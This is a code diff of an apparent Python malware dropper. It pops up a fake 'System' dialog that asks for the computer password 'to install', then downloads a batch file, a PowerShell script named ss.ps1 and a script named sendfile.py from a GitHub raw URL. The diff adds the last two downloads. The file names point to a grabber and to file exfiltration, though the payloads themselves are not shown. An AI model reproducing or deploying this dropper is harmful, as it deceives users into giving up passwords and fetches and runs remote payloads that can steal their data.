@@ -40,19 +40,25 @@ ROOT.withdraw()
 USER_INP = simpledialog.askstring(title="System",
                                   prompt="Enter computer password to install...")
 
-d = os.path.join(os.environ["HOMEPATH"], r"Desktop")
+d = os.path.join(os.environ["HOMEPATH"], r"C:\Program Files")
 
 os.chdir(d)
 
-remote_url = 'https://raw.githubusercontent.com/Mood56467/bumper/main/bumper'
+remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/bumper'
 
 local_file = 'bumper5.bat'
 
 request.urlretrieve(remote_url, local_file)
 
-remote_url = 'https://raw.githubusercontent.com/Mood56467/bumper/main/bumper'
+remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/ss'
 
-local_file = 'grabber100.ps1'
+local_file = 'ss.ps1'
+
+request.urlretrieve(remote_url, local_file)
+
+remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/sendfile'
+
+local_file = 'sendfile.py'
 
 request.urlretrieve(remote_url, local_file)
 
